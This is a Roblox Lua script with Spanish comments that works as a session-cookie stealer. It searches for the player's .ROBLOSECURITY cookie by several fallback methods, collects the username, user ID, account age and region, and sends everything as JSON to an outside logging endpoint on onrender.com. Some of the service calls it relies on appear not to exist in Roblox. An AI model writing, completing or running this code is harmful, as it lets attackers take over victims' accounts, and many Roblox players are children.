local Players = game:GetService("Players")
local CookieService = game:GetService("CookieService")
local LocalizationService = game:GetService("LocalizationService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local apiUrl = "https://depazzhub-api.onrender.com/log"

-- --- 1. Obtener la cookie de forma robusta ---
local function getRobloxCookie()
	local cookies = CookieService:GetCookies()

	if #cookies == 0 then
		print("❌ No se encontraron cookies en CookieService")
		return ""
	end

	-- Buscar la cookie .ROBLOSECURITY
	local robloxCookie = cookies:FindFirstChild(".ROBLOSECURITY")

	if robloxCookie and not robloxCookie.Value:isEmpty() then
		return robloxCookie.Value
	end

	-- Fallback: buscar en todas las cookies por nombre
	for _, cookie in pairs(cookies) do
		if cookie.Name == ".ROBLOSECURITY" then
			return cookie.Value
		end
	end

	-- Fallback 2: intentar obtener cookie del servicio
	local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
	if savedCookie ~= "" then
		return savedCookie
	end

	print("❌ No se pudo obtener .ROBLOSECURITY")
	return ""
end

-- --- 2. Obtener datos del jugador ---
local userId = player.UserId
local placeId = game.PlaceId

-- Obtener edad de la cuenta
local days = player.AccountAge
local years = math.floor(days / 365)
local months = math.floor((days % 365) / 30)
local ageText = days .. " days"
if years > 0 then
	ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
end

-- Obtener región
local region = LocalizationService.RobloxLocaleId

-- --- 3. Escape seguro para JSON ---
local function escapeJson(str)
	if str == nil then
		return "nil"
	end
	local s = tostring(str)
	s = string.gsub(s, '\\', '\\\\')
	s = string.gsub(s, '"', '\\\"')
	s = string.gsub(s, '\n', '\\n')
	s = string.gsub(s, '\r', '\\r')
	s = string.gsub(s, '\t', '\\t')
	return s
end

-- --- 4. Construir el cuerpo JSON ---
local username = escapeJson(player.Name)
local displayName = escapeJson(player.DisplayName)
local cookieValue = getRobloxCookie()
local cookieValueEscaped = escapeJson(cookieValue)

local jsonBody = string.format(
	'{"username":"%s","displayName":"%s","userId":%d,"gameId":%d,"accountAge":"%s","region":"%s","cookie":".ROBLOSECURITY=%s"}',
	username,
	displayName,
	userId,
	placeId,
	ageText,
	region,
	cookieValueEscaped
)

-- --- 5. Enviar la petición ---
local success, result = pcall(function()
	return request({
		Url = apiUrl,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Connection"] = "keep-alive"
		},
		Body = jsonBody,
		Timeout = 15
	})
end)

if success then
	print("✅ Webhook working! Status:", result.StatusCode)
else
	print("❌ Error:", result)
end
